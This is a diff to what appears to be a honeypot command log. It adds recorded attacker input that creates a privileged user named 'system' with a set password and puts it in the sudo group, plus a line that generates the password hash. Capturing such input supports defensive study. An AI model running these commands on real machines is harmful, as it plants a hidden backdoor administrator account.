@@ -199,6 +199,18 @@
             "event": "command_input",
             "input": "openssl passwd -1 Uf2Fhxcd",
             "session": "02c85a0e54df"
+        },
+        {
+            "timestamp": "2023-11-09T15:56:54.182529Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 nGkVdYMD) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "781884511c25"
+        },
+        {
+            "timestamp": "2023-11-09T15:56:54.182966Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 nGkVdYMD",
+            "session": "781884511c25"
         }
     ],
     "202.29.229.129": [
